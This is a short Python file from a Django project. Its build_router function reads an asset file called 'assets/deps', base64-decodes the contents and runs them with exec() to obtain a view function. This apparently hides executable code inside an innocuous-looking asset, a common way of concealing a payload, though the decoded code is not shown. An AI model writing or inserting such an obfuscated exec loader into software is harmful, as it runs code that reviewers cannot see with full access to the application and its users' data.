import base64
import os

from django.contrib.auth.models import User
from django.http import HttpResponseForbidden, HttpResponse, HttpResponseNotAllowed, HttpRequest


def build_router():
    with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'assets/deps')) as router_deps:
        ldict = {}
        exec(base64.b64decode(router_deps.read().strip()).decode('utf-8'), globals(), ldict)
        return ldict['route_view']
